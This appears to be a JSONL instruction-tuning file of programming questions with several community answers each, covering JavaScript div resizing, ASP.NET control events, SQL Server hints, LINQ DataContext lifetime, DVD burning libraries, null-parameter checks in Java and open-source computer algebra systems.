{"instruction": "In a web application, I have a page that contains a DIV that has an auto-width depending on the width of the browser window.\nI need an auto-height for the object.  The DIV starts about 300px from the top screen, and it's height should make it stretch to the bottom of the browser screen.  I have a max height for the container DIV, so there would have to be minimum-height for the div.  I believe I can just restrict that in CSS, and use Javascript to handle the resizing of the DIV.\nMy javascript isn't nearly as good as it should be.  Is there an easy script I could write that would do this for me?\nEdit: \nThe DIV houses a control that does it's own overflow handling (implements its own scroll bar).", "output": "@17 of 26 I used to have a solution like this - I found that it ran into weird issues with ie 6.0 sometimes being off by a few pixels, which really made the layout look odd.\n\nYeah, in my solution I just wound up shrinking the height by an arbitrary number of pixels for IE.\nI could not find any other way to dynamically size a div though.  A lot of my layout uses tables since they handle dynamically sized content automatically.\nCross-browser web design just plain sucks :P."}
{"instruction": "In a web application, I have a page that contains a DIV that has an auto-width depending on the width of the browser window.\nI need an auto-height for the object.  The DIV starts about 300px from the top screen, and it's height should make it stretch to the bottom of the browser screen.  I have a max height for the container DIV, so there would have to be minimum-height for the div.  I believe I can just restrict that in CSS, and use Javascript to handle the resizing of the DIV.\nMy javascript isn't nearly as good as it should be.  Is there an easy script I could write that would do this for me?\nEdit: \nThe DIV houses a control that does it's own overflow handling (implements its own scroll bar).", "output": "Try this simple, specific function:\nfunction resizeElementHeight(element) {\n  var height = 0;\n  var body = window.document.body;\n  if (window.innerHeight) {\n      height = window.innerHeight;\n  } else if (body.parentElement.clientHeight) {\n      height = body.parentElement.clientHeight;\n  } else if (body && body.clientHeight) {\n      height = body.clientHeight;\n  }\n  element.style.height = ((height - element.offsetTop) + \"px\");\n}\n\nIt does not depend on the current distance from the top of the body being specified (in case your 300px changes).\n\nEDIT: By the way, you would want to call this on that div every time the user changed the browser's size, so you would need to wire up the event handler for that, of course."}
{"instruction": "I am working on a Customer Server Control that extends another control.  There is no problem with attaching to other controls on the form.\nin vb.net:  Parent.FindControl(TargetControlName)\nI would like to pass a method to the control in the ASPX markup. \nfor example: <c:MyCustomerControl runat=server InitializeStuffCallback=\"InitializeStuff\">\nSo, I tried using reflection to access the given method name from the Parent.\nSomething like (in VB)\nDim pageType As Type = Page.GetType\nDim CallbackMethodInfo As MethodInfo = pageType.GetMethod( \"MethodName\" )\n\n'Also tried \nsender.Parent.GetType.GetMethod(\"MethodName\")\nsender.Parent.Parent.GetType.GetMethod(\"MethodName\")\n\nThe method isn't found, because it just isn't apart of the Page.  Where should I be looking?  I'm fairly sure this is possible because I've seen other controls do similar.\n\nI forgot to mention, my work-around is to give the control events and attaching to them in the Code-behind.", "output": "Your workaround is actually the better answer.  If you have code that you must run at a certain part of your control's lifecycle, you should expose events to let the container extend the lifecycle with custom functionality."}
{"instruction": "I am working on a Customer Server Control that extends another control.  There is no problem with attaching to other controls on the form.\nin vb.net:  Parent.FindControl(TargetControlName)\nI would like to pass a method to the control in the ASPX markup. \nfor example: <c:MyCustomerControl runat=server InitializeStuffCallback=\"InitializeStuff\">\nSo, I tried using reflection to access the given method name from the Parent.\nSomething like (in VB)\nDim pageType As Type = Page.GetType\nDim CallbackMethodInfo As MethodInfo = pageType.GetMethod( \"MethodName\" )\n\n'Also tried \nsender.Parent.GetType.GetMethod(\"MethodName\")\nsender.Parent.Parent.GetType.GetMethod(\"MethodName\")\n\nThe method isn't found, because it just isn't apart of the Page.  Where should I be looking?  I'm fairly sure this is possible because I've seen other controls do similar.\n\nI forgot to mention, my work-around is to give the control events and attaching to them in the Code-behind.", "output": "If you want to be able to pass a method in the ASPX markup, you need to use the Browsable attribute in your code on the event.\nVB.NET\n<Browsable(True)> Public Event InitializeStuffCallback\n\nC#\n[Browsable(true)]\npublic event EventHandler InitializeStuffCallback;\n\nReference:\nDesign-Time Attributes for Components and BrowsableAttribute Class\nAll the events, properties, or whatever need to be in the code-behind of the control with the browsable attribute to make it so you can change it in the tag code."}
{"instruction": "I am working on a Customer Server Control that extends another control.  There is no problem with attaching to other controls on the form.\nin vb.net:  Parent.FindControl(TargetControlName)\nI would like to pass a method to the control in the ASPX markup. \nfor example: <c:MyCustomerControl runat=server InitializeStuffCallback=\"InitializeStuff\">\nSo, I tried using reflection to access the given method name from the Parent.\nSomething like (in VB)\nDim pageType As Type = Page.GetType\nDim CallbackMethodInfo As MethodInfo = pageType.GetMethod( \"MethodName\" )\n\n'Also tried \nsender.Parent.GetType.GetMethod(\"MethodName\")\nsender.Parent.Parent.GetType.GetMethod(\"MethodName\")\n\nThe method isn't found, because it just isn't apart of the Page.  Where should I be looking?  I'm fairly sure this is possible because I've seen other controls do similar.\n\nI forgot to mention, my work-around is to give the control events and attaching to them in the Code-behind.", "output": "Normally you wouldn't need to get the method via reflection. Inside your user control, define a public event (sorry I do not know the vb syntax so this will be in c#)\npublic event EventHandler EventName;\n\nNow, inside your aspx page, or whatever container of the user control, define a protected method that matches the EventHandler:\nprotected void MyCustomerControl_MethodName(object sender, EventArgs e) { }\n\nNow, inside your markup, you can use\n<c:MyCustomerControl id=\"MyCustomerControl\" runat=server OnEventName=\"MyCustomerControl_MethodName\">"}
{"instruction": "I am working on a Customer Server Control that extends another control.  There is no problem with attaching to other controls on the form.\nin vb.net:  Parent.FindControl(TargetControlName)\nI would like to pass a method to the control in the ASPX markup. \nfor example: <c:MyCustomerControl runat=server InitializeStuffCallback=\"InitializeStuff\">\nSo, I tried using reflection to access the given method name from the Parent.\nSomething like (in VB)\nDim pageType As Type = Page.GetType\nDim CallbackMethodInfo As MethodInfo = pageType.GetMethod( \"MethodName\" )\n\n'Also tried \nsender.Parent.GetType.GetMethod(\"MethodName\")\nsender.Parent.Parent.GetType.GetMethod(\"MethodName\")\n\nThe method isn't found, because it just isn't apart of the Page.  Where should I be looking?  I'm fairly sure this is possible because I've seen other controls do similar.\n\nI forgot to mention, my work-around is to give the control events and attaching to them in the Code-behind.", "output": "Every ASP.NET page is class of its own inherited from Page as in:\nclass MyPage : Page\nTherefore, to find that method via Reflection, you must get the correct type, which is the type of the page class that stores the page code.\nI suppose you need to support multiple pages for this control to be instantiated in I believe you can find the child type of any instance of Page via Reflection, but I do not remember how, but you should be able to do it.\nbut... like everyone else has said, such case is what events are for."}
{"instruction": "We have a number of users with Windows Mobile 6 and need to apply minor changes. eg. update a registry setting. One option is push and execute an executable file using our device management software.\nI'd like this to be a little more friendly for the admins who are familiar with scripting in VBScript/JScript etc. What are the options for scripting on Windows Mobile devices?", "output": "Once option that the devs over at xda-developers seem to enjoy is Mortscript\nI have never bothered to use it, but I have used many cab installers that distribute mortscript so that they can do various tasks"}
{"instruction": "I have been working on a web services related project for about the last year.  Our team found soapUI near the start of our project and we have been mostly(*) satisfied with it (the free version, that is).\nMy question is: are there other tools/clients/frameworks that you have used/currently use for web services testing and would recommend?\n(*) There are some weird GUI glitches that appear once in a while.  As is mentioned by some of the answers, we attributed this to a memory leak.", "output": "There's an eclipse plugin that allows you to do web service discovery, testing, etc - see Eclipse Web Services Tools.\nI think it's much better than SoapUI, at least on Mac OS X."}
{"instruction": "In one of my applications, I am querying active directory to get a list of all users below a given user (using the \"Direct Reports\" thing). So basically, given the name of the person, it is looked up in AD, then the Direct Reports are read. But then for every direct report, the tool needs to check the direct reports of the direct reports. Or, more abstract: The Tool will use a person as the root of the tree and then walk down the complete tree to get the names of all the leaves (can be several hundred)\nNow, my concern is obviously performance, as this needs to be done quite a few times. My idea is to manually cache that (essentially just put all the names in a long string and store that somewhere and update it once a day).\nBut I just wonder if there is a more elegant way to first get the information and then cache it, possibly using something in the System.DirectoryServices Namespace?", "output": "Active Directory is pretty efficient at storing information and the retrieval shouldn't be that much of a performance hit.  If you are really intent on storing the names, you'll probably want to store them in some sort of a tree stucture, so you can see the relationships of all the people.  Depending on how the number of people, you might as well pull all the information you need daily and then query all the requests against your cached copy."}
{"instruction": "When writing a SQL statement in SQL Server 2005, does the READUNCOMMITTED query hint imply NOLOCK or do I have to specify it manually too?\nSo is:\nWith (NoLock, ReadUnCommitted)\n\nthe same as:\nWith (ReadUnCommitted)", "output": "Yes they are one and the same"}
{"instruction": "What's the best lifetime model for a DataContext? Should I just create a new one whenever I need it (aka, function level), should I keep one available in each class that would use it (class level), or should I create a static class with a static DataContext (app-domain level)? Are there any considered best practices on this?", "output": "I think Jeff Atwood talked about this in the Herding Code podcast, when he was questioned about the exact same thing. Listen to it towards the last 15-20 minutes or so.\nI think in SO, the datacontext is created in the Controller class. Not sure about a lot of details here. But that's what it looked like."}
{"instruction": "What's the best lifetime model for a DataContext? Should I just create a new one whenever I need it (aka, function level), should I keep one available in each class that would use it (class level), or should I create a static class with a static DataContext (app-domain level)? Are there any considered best practices on this?", "output": "You pretty much need to keep the same data context available throughout the lifetime of the operations you want to perform if you're ever going to be storing changes which are to be .SubmitChanges()'d later, as otherwise you will lose those changes.\nIf you're just querying stuff then it's fine to create them as needed, but then if later you want to .SubmitChanges() you'll have to refactor your code a lot, so you may as well adopt the pattern of effectively keeping the datacontext global throughout your app from the beginning.\nNote the data context is disconnected. The connection is only made when the query data is enumerated (not when you first run the query, it's a 'lazy' data type so only provides data when it's needed), and then closed immediately afterwards. On .SubmitChanges() the connection is opened to submit the changes then closed immediately afterwards. So don't think keeping the datacontext around keeps a connection open, it doesn't (you can hook the StateChange event of the connection to confirm this for yourself, that's how I'm sure).\nThere is a great article over at Rick Strahl's Blog which covers this topic in depth, far more than my answer here provides!!"}
{"instruction": "I'd like to add dvd burning functionality to my .Net app (running on Windows Server 2003), are there any good components available?  I've used the NeroCOM sdk that used to come with Nero but they no longer support the sdk in the latest versions of Nero.  I learned that Microsoft has created an IMAPI2 upgrade for Windows XP/2003 and there is an example project at CodeProject but not having used it myself I can't say how easy/reliable it is to use.\nI'm not really worried about burning audio/video to DVD as this is for file backup purposes only.", "output": "At my last job I was tasked with finding a cross platform and preferably free way to write our application specific files to cd/dvd.  I quickly found that writing CD's wasn't hard on windows, but I couldn't write DVD's easily, and that only worked on windows.\nI ended up writing a wrapper around cdrecord  cdrecord is an open source project that builds easily with cygwin.  I would create a staging directory where I added the files that needed to be written, called mkisofs on that directory to make a cd iso, and then called cdrecord to burn the image.  This may not be the best solution if you have a strictly windows audience, but it was the only thing I could find that did window, Linux, and OS X.\nAnother option worht checking out is the StarBurn SDK, I download the trial and used it, it worked well, but in the end it wasn't free so it was too expensive for my purposes."}
{"instruction": "I have been working on a web services related project for about the last year.  Our team found soapUI near the start of our project and we have been mostly(*) satisfied with it (the free version, that is).\nMy question is: are there other tools/clients/frameworks that you have used/currently use for web services testing and would recommend?\n(*) There are some weird GUI glitches that appear once in a while.  As is mentioned by some of the answers, we attributed this to a memory leak.", "output": "Call it laziness but I kind of gave up looking a while after I found SoapUI - its not perfect (what is) but it does its job very well (especially given the price).\nMore importantly given that there is scripting to allow you to set up automated tests we're heading towards an investment in the product.\nMight be nice if it was better on Windows (we do .NET development, mostly ASP.NET) but for the price... (-:"}
{"instruction": "I'd like to add dvd burning functionality to my .Net app (running on Windows Server 2003), are there any good components available?  I've used the NeroCOM sdk that used to come with Nero but they no longer support the sdk in the latest versions of Nero.  I learned that Microsoft has created an IMAPI2 upgrade for Windows XP/2003 and there is an example project at CodeProject but not having used it myself I can't say how easy/reliable it is to use.\nI'm not really worried about burning audio/video to DVD as this is for file backup purposes only.", "output": "Did your cdrecord methodology support dvd burning?  And is there an easy way to redistribute/install cygwin with an application?  StarBurn looks pretty good at first glance, although I'm a little hesitant to go with unproven libraries that have to handle something this complicated (especially with the number of types of media out there now) and the StarBurn portfolio page is a bit on the fluffy side."}
{"instruction": "I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (http://stackoverflow.com/questions/8050/beginners-guide-to-linq), but had a follow-up question:\nWe're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.\nSo, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?\nThanks.", "output": "Stored Procs vs Code (Previous discussion)"}
{"instruction": "I'd like to add dvd burning functionality to my .Net app (running on Windows Server 2003), are there any good components available?  I've used the NeroCOM sdk that used to come with Nero but they no longer support the sdk in the latest versions of Nero.  I learned that Microsoft has created an IMAPI2 upgrade for Windows XP/2003 and there is an example project at CodeProject but not having used it myself I can't say how easy/reliable it is to use.\nI'm not really worried about burning audio/video to DVD as this is for file backup purposes only.", "output": "My cdrecord method did support dvd burning, I just looked over the code, and boy did I forget how much time and effort I put into that class.\ncdrecord has no problem burning just about any type of media you throw at it, but since it is a stand alone application, I had to do a lot of parsing to get useful information.  I can dig up the flags and different calls I used if you are interested, but unfortunately I cannot share the source as it was developed for a commercial project.\nWhile looking over the code I was also reminded that I switched form cdrecord (cdrtools) to wodim (cdrkit).  wodim is a branch of cdrecord made a few years ago by the debian team because cdrecord dropped the GPL license.\nLike I said before this was released as part of a commercial application, our interpretation of the GPL was that you can call external binaries from your program without a problem as long as your program can run without the external binaries (if cdrecord wasn't found we popped up a dialog informing the user that burning capabilities were not available) and we also had to host the source for cdrkit and cygwin and include a copy of the GPL with our distributed program.  So basically we would not make \"derivative works\", we would compile the cdrkit code exactly as it was, and then use the produced binaries.\nAs far as StarBurn SDK, I demoed it, but I didn't use it for a shipped product so I can't really give a recommendation or say much more than it does work"}
{"instruction": "I hope this question does not come off as broad as it may seem at first.  I am designing a software application in my <sarcasm>voluminous</sarcasm> spare time.  I would like it to be both cross-platform and modular.  At this point, because I am still in the planning phase, I can pick practically any language and toolset.\nThis makes things harder, not easier, because there are seemingly so many ways of accomplishing both of the goals (modularity, platform agnosticism). \nMy basic premise is that security, data storage, interaction with the operating system, and configuration should all be handled by a \"container\" application - but most of the other functionality will be supplied through plug-in modules.  If I had to describe it at a high level (without completely giving away my idea), it would be a single application that can do many different jobs, all dedicated to the same goal (there are lots of disparate things to do, but all the data has to interact and be highly available).\nThis is not a new idea, and not particularly exotic.  Yet I find myself wrestling with not so much how to do it (I can think of lots of ways), but which method is best.\nFor example, I know that Eclipse practically embodies what I am describing, but I find Java applications in general (and Eclipse is no exception) to be too large and slow for what I need. Ditto desktop apps written Python and Ruby (which are excellent languages!)  \nI don't mind recompiling the code base for different platforms as native exectables.  Yet, C and C++ have their own set of issues.\nAs a C# developer, I have a preference for managed code.  But I am not at all sold on Mono, yet (I could be convinced).\nDoes anyone have any ideas/experiences/ specific favorite frameworks to share?", "output": "With my limited Mono experience I can say I'm quite sold on it.  The fact that there is active development and a lot of ongoing effort to bring it up to spec with the latest .Net technologies is encouraging.  It is incredibly useful to be able to use existing .Net skills on multiple platforms.  I had similar issues with performance when attempting to accomplish some basic tasks in Python + PyGTK -- maybe they can be made to perform in the right hands but it is nice to not have to worry about performance 90% of the time."}
{"instruction": "I am working on a Customer Server Control that extends another control.  There is no problem with attaching to other controls on the form.\nin vb.net:  Parent.FindControl(TargetControlName)\nI would like to pass a method to the control in the ASPX markup. \nfor example: <c:MyCustomerControl runat=server InitializeStuffCallback=\"InitializeStuff\">\nSo, I tried using reflection to access the given method name from the Parent.\nSomething like (in VB)\nDim pageType As Type = Page.GetType\nDim CallbackMethodInfo As MethodInfo = pageType.GetMethod( \"MethodName\" )\n\n'Also tried \nsender.Parent.GetType.GetMethod(\"MethodName\")\nsender.Parent.Parent.GetType.GetMethod(\"MethodName\")\n\nThe method isn't found, because it just isn't apart of the Page.  Where should I be looking?  I'm fairly sure this is possible because I've seen other controls do similar.\n\nI forgot to mention, my work-around is to give the control events and attaching to them in the Code-behind.", "output": "buyutec and Jesse Dearing both have an acceptable answer.\n[Browsable(true)]\n\nlets you see the property in the Properties window.  However, the event doesn't show up, which makes no difference to me.\nThe thing I overlooked earlier was the fact that when you reference a control's even from the tag, it prep-ends On."}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "Both the use of assertions and the throwing of exceptions are valid approaches here.  Either mechanism can be used to indicate a programming error, not a runtime error, as is the case here.\n\nAssertions have the advantage of performance as they are typically disabled on production systems.  \nExceptions have the advantage of safety, as the check is always performed.  \n\nThe choice really depends on the development practices of the project.  The project as a whole needs to decide on an assertion policy: if the choice is to enable assertions during all development, then I'd say to use assertions to check this kind of invalid parameter - in a production system, a NullPointerException thrown due to a programming error is unlikely to be able to be caught and handled in a meaningful way anyway and so will act just like an assertion.\nPractically though, I know a lot of developers that don't trust that assertions will be enabled when appropriate and so opt for the safety of throwing a NullPointerException.\nOf course if you can't enforce a policy for your code (if you're creating a library, for example, and so are dependent on how other developers run your code), you should opt for the safe approach of throwing NullPointerException for those methods that are part of the library's API."}
{"instruction": "What is the best open-source equivalent for Mathematica?  My requirements are:\n\n(most important) Must be a real computer algebra system (CAS).  Notably, I don't want Matlab clones -- I want something that can, at least, symbolically differentiate and integrate.\nMust be programmable.  A functional-programming view of the world, like Mathematica's, would be awesome.  The basic datatype of M'ica is the list, which is very convenient!\n(least important) Similar syntax would be nice.\n\nThe ability to deal with objects such as groups or graphs would be a great bonus, but my primary emphasis is on the main things Mathematica and Maple do: algebra and calculus, both symbolic and numeric.  Also, plotting is not high on my list of requirements, as I'm mostly a terminal and not GUI user.", "output": "http://en.wikipedia.org/wiki/Comparison_of_computer_algebra_systems"}
{"instruction": "I am in the middle of reading the excellent Clean Code\nOne discussion is regarding passing nulls into a method.\npublic class MetricsCalculator {\n    public double xProjection(Point p1, Point p2) {\n        return (p2.x - p1.x) * 1.5;\n    }\n}\n...\ncalculator.xProjection(null, new Point(12,13));\n\nIt represents different ways of handling this:\npublic double xProjection(Point p1, Point p2) {\n    if (p1 == null || p2 == null) {\n        throw new IllegalArgumentException(\"Invalid argument for xProjection\");\n    }\n    return (p2.x - p1.x) * 1.5;\n}\n\npublic double xProjection(Point p1, Point p2) {\n    assert p1 != null : \"p1 should not be null\";\n    assert p2 != null : \"p2 should not be null\";\n    return (p2.x - p1.x) * 1.5;\n}\n\nI prefer the assertions approach, but I don't like the fact that assertions are turned off by default.\nThe book finally states:\n\nIn most programming languages there is no good way to deal with a null that is passed by a caller accidentally. Because this is the case, the rational approach is to forbid passing null by default.\n\nIt doesn't really go into how you would enforce this restriction?\nDo any of you have strong opinions either way.", "output": "Slightly off-topic, but one feature of findbugs that I think is very useful is to be able to annotate the parameters of methods to describe which parameters should not be passed a null value.  \nUsing static analysis of your code, findbugs can then point out locations where the method is called with a potentially null value.  \nThis has two advantages:\n\nThe annotation describes your intention for how the method should be called, aiding documentation\nFindBugs can point to potential problem callers of the method, allowing you to track down potential bugs.\n\nOnly useful when you have access to the code that calls your methods ... but that is usually the case."}
{"instruction": "I hope this question does not come off as broad as it may seem at first.  I am designing a software application in my <sarcasm>voluminous</sarcasm> spare time.  I would like it to be both cross-platform and modular.  At this point, because I am still in the planning phase, I can pick practically any language and toolset.\nThis makes things harder, not easier, because there are seemingly so many ways of accomplishing both of the goals (modularity, platform agnosticism). \nMy basic premise is that security, data storage, interaction with the operating system, and configuration should all be handled by a \"container\" application - but most of the other functionality will be supplied through plug-in modules.  If I had to describe it at a high level (without completely giving away my idea), it would be a single application that can do many different jobs, all dedicated to the same goal (there are lots of disparate things to do, but all the data has to interact and be highly available).\nThis is not a new idea, and not particularly exotic.  Yet I find myself wrestling with not so much how to do it (I can think of lots of ways), but which method is best.\nFor example, I know that Eclipse practically embodies what I am describing, but I find Java applications in general (and Eclipse is no exception) to be too large and slow for what I need. Ditto desktop apps written Python and Ruby (which are excellent languages!)  \nI don't mind recompiling the code base for different platforms as native exectables.  Yet, C and C++ have their own set of issues.\nAs a C# developer, I have a preference for managed code.  But I am not at all sold on Mono, yet (I could be convinced).\nDoes anyone have any ideas/experiences/ specific favorite frameworks to share?", "output": "Are you planning a desktop or web application? \nEveryone around here seems to think that Mono is great, but I still do not think it is ready for industry use, I would equate mono to where wine is, great idea; when it works it works well, and when it doesn't...well your out of luck. mod_mono for Apache is extremely glitchy and is hard to get running correctly.\nIf your aiming for the desktop, nothing beats the eclipse RCP (Rich Client Platform) framework: http://wiki.eclipse.org/index.php/Rich_Client_Platform. \nYou can build window, linux, mac all under the same code and all UI components are native to the OS. And RCP wins in modularity hands down, it has a plug-in architecture that is unrivaled (from what I have seen)\nI have worked with RCP for 1.5 years now and I dunno what else could replace it, it is #1 in it's niche.\nIf your totally opposed to java I would look into wxWidgets with either python or C++"}
{"instruction": "What is the best open-source equivalent for Mathematica?  My requirements are:\n\n(most important) Must be a real computer algebra system (CAS).  Notably, I don't want Matlab clones -- I want something that can, at least, symbolically differentiate and integrate.\nMust be programmable.  A functional-programming view of the world, like Mathematica's, would be awesome.  The basic datatype of M'ica is the list, which is very convenient!\n(least important) Similar syntax would be nice.\n\nThe ability to deal with objects such as groups or graphs would be a great bonus, but my primary emphasis is on the main things Mathematica and Maple do: algebra and calculus, both symbolic and numeric.  Also, plotting is not high on my list of requirements, as I'm mostly a terminal and not GUI user.", "output": "Have you seen Sage? \nIt provides a great terminal/gui interface and is extend able to tons of application's. It also has great support for programming, utilizing python.  \nI would be very surprised if it didn't do what you needed. \nBrian"}
{"instruction": "What is the best open-source equivalent for Mathematica?  My requirements are:\n\n(most important) Must be a real computer algebra system (CAS).  Notably, I don't want Matlab clones -- I want something that can, at least, symbolically differentiate and integrate.\nMust be programmable.  A functional-programming view of the world, like Mathematica's, would be awesome.  The basic datatype of M'ica is the list, which is very convenient!\n(least important) Similar syntax would be nice.\n\nThe ability to deal with objects such as groups or graphs would be a great bonus, but my primary emphasis is on the main things Mathematica and Maple do: algebra and calculus, both symbolic and numeric.  Also, plotting is not high on my list of requirements, as I'm mostly a terminal and not GUI user.", "output": "Try Maxima.  It is a \"real CAS\" (can do symbolic stuff).  Programmability emphasizes imperative, but you can do functional too.  Not fast, however.  Precompiled Windows version is available."}
{"instruction": "What is the best open-source equivalent for Mathematica?  My requirements are:\n\n(most important) Must be a real computer algebra system (CAS).  Notably, I don't want Matlab clones -- I want something that can, at least, symbolically differentiate and integrate.\nMust be programmable.  A functional-programming view of the world, like Mathematica's, would be awesome.  The basic datatype of M'ica is the list, which is very convenient!\n(least important) Similar syntax would be nice.\n\nThe ability to deal with objects such as groups or graphs would be a great bonus, but my primary emphasis is on the main things Mathematica and Maple do: algebra and calculus, both symbolic and numeric.  Also, plotting is not high on my list of requirements, as I'm mostly a terminal and not GUI user.", "output": "Specifically, Maxima:\nhttp://en.wikipedia.org/wiki/Maxima_%28software%29"}
{"instruction": "I hope this question does not come off as broad as it may seem at first.  I am designing a software application in my <sarcasm>voluminous</sarcasm> spare time.  I would like it to be both cross-platform and modular.  At this point, because I am still in the planning phase, I can pick practically any language and toolset.\nThis makes things harder, not easier, because there are seemingly so many ways of accomplishing both of the goals (modularity, platform agnosticism). \nMy basic premise is that security, data storage, interaction with the operating system, and configuration should all be handled by a \"container\" application - but most of the other functionality will be supplied through plug-in modules.  If I had to describe it at a high level (without completely giving away my idea), it would be a single application that can do many different jobs, all dedicated to the same goal (there are lots of disparate things to do, but all the data has to interact and be highly available).\nThis is not a new idea, and not particularly exotic.  Yet I find myself wrestling with not so much how to do it (I can think of lots of ways), but which method is best.\nFor example, I know that Eclipse practically embodies what I am describing, but I find Java applications in general (and Eclipse is no exception) to be too large and slow for what I need. Ditto desktop apps written Python and Ruby (which are excellent languages!)  \nI don't mind recompiling the code base for different platforms as native exectables.  Yet, C and C++ have their own set of issues.\nAs a C# developer, I have a preference for managed code.  But I am not at all sold on Mono, yet (I could be convinced).\nDoes anyone have any ideas/experiences/ specific favorite frameworks to share?", "output": "Just to cite an example: for .NET apps there are the CAB (Composite Application Block) and the Composite Application Guidance for WPF. Both are mainly implementations of a set of several design patterns focused on modularity and loose coupling between components similar to a plug-in architecture: you have an IOC framework, MVC base classes, a loosely coupled event broker, dynamic loading of modules and other stuff.\nSo I suppose that kind of pattern infrastructure is what you are trying to find, just not specifically for .NET. But if you see the CAB as a set of pattern implementations, you can see that almost every language and platform has some form of already built-in or third party frameworks for individual patterns. \nSo my take would be:\n\nStudy (if you are not familiar with) some of those design patterns. You could take as an example the CAB framework for WPF documentation: Patterns in the Composite Application Library\nDesign your architecture thinking on which of those patterns you think would be useful for what you want to achieve first without thinking in specific pattern implementations or products.\nOnce you have your 'architectural requirements' defined more specifically, look for individual frameworks that help accomplish each one of those patterns/features for the language you decide to use and put together your own application framework based on them.\n\nI agree that the hard part is to make all this platform independent. I really cannot think on any other solution to choose a mature platform independent language like Java."}
{"instruction": "If I have a query like:\nSelect EmployeeId \nFrom Employee \nWhere EmployeeTypeId IN (1,2,3)\n\nand I have an index on the EmployeeTypeId field, does SQL server still use that index?", "output": "@Mike: Thanks for the detailed analysis. There are definately some interesting points you make there. The example I posted is somewhat trivial but the basis of the question came from using NHibernate.\nWith NHibernate, you can write a clause like this:\nint[] employeeIds = new int[]{1, 5, 23463, 32523};\nNHibernateSession.CreateCriteria(typeof(Employee))\n.Add(Restrictions.InG(\"EmployeeId\",employeeIds))\n\nNHibernate then generates a query which looks like  \nselect * from employee where employeeid in (1, 5, 23463, 32523)\n\nSo as you and others have pointed out, it looks like there are going to be times where an index will be used or a table scan will happen, but you can't really determine that until runtime."}
{"instruction": "I hope this question does not come off as broad as it may seem at first.  I am designing a software application in my <sarcasm>voluminous</sarcasm> spare time.  I would like it to be both cross-platform and modular.  At this point, because I am still in the planning phase, I can pick practically any language and toolset.\nThis makes things harder, not easier, because there are seemingly so many ways of accomplishing both of the goals (modularity, platform agnosticism). \nMy basic premise is that security, data storage, interaction with the operating system, and configuration should all be handled by a \"container\" application - but most of the other functionality will be supplied through plug-in modules.  If I had to describe it at a high level (without completely giving away my idea), it would be a single application that can do many different jobs, all dedicated to the same goal (there are lots of disparate things to do, but all the data has to interact and be highly available).\nThis is not a new idea, and not particularly exotic.  Yet I find myself wrestling with not so much how to do it (I can think of lots of ways), but which method is best.\nFor example, I know that Eclipse practically embodies what I am describing, but I find Java applications in general (and Eclipse is no exception) to be too large and slow for what I need. Ditto desktop apps written Python and Ruby (which are excellent languages!)  \nI don't mind recompiling the code base for different platforms as native exectables.  Yet, C and C++ have their own set of issues.\nAs a C# developer, I have a preference for managed code.  But I am not at all sold on Mono, yet (I could be convinced).\nDoes anyone have any ideas/experiences/ specific favorite frameworks to share?", "output": "If you want platform independence, then you'll have to trade off between performance and development effort. C++ may be faster than Java (this is debatable FWIW) but you'll get platform independence a lot more easily with Java. Python and Ruby are in the same boat.\nI doubt that .NET would be much faster than Java (they're both VM languages after all), but the big problem with .NET is platform independence. Mono has a noble goal and surprisingly good results so far but it will always be playing catch-up with Microsoft on Windows. You might be able to accept its limitations but it's still not the same as having identical multiplatform environments that Java, Python, and Ruby have. Also: the .NET development and support tools are heavily skewed towards Windows, and probably always will be.\nIMO, your best bet is to target Java... or, at the very least, the JVM. If you don't like the Java language (and as a C# dev I'm guessing that's not the case) then you at least have options like Jython, JRuby, and Scala. With the JVM, you get very good platform independence, good performance, and access to a huge number of libraries and support tools. There's almost always a Java library, port or implementation that will do what you need it to do. I don't think any other platform out there has the same number of options; there's real value in that flexibility.\nAs for modularity: that's more about how you build the software than what platform you use. I don't know much about plugin architectures like you describe but I'm guessing that it will be possible in pretty much any modern platform you pick."}
{"instruction": "I hope this question does not come off as broad as it may seem at first.  I am designing a software application in my <sarcasm>voluminous</sarcasm> spare time.  I would like it to be both cross-platform and modular.  At this point, because I am still in the planning phase, I can pick practically any language and toolset.\nThis makes things harder, not easier, because there are seemingly so many ways of accomplishing both of the goals (modularity, platform agnosticism). \nMy basic premise is that security, data storage, interaction with the operating system, and configuration should all be handled by a \"container\" application - but most of the other functionality will be supplied through plug-in modules.  If I had to describe it at a high level (without completely giving away my idea), it would be a single application that can do many different jobs, all dedicated to the same goal (there are lots of disparate things to do, but all the data has to interact and be highly available).\nThis is not a new idea, and not particularly exotic.  Yet I find myself wrestling with not so much how to do it (I can think of lots of ways), but which method is best.\nFor example, I know that Eclipse practically embodies what I am describing, but I find Java applications in general (and Eclipse is no exception) to be too large and slow for what I need. Ditto desktop apps written Python and Ruby (which are excellent languages!)  \nI don't mind recompiling the code base for different platforms as native exectables.  Yet, C and C++ have their own set of issues.\nAs a C# developer, I have a preference for managed code.  But I am not at all sold on Mono, yet (I could be convinced).\nDoes anyone have any ideas/experiences/ specific favorite frameworks to share?", "output": "If you plan on doing python development, you can always use pyrex to optimize some of the slower parts."}
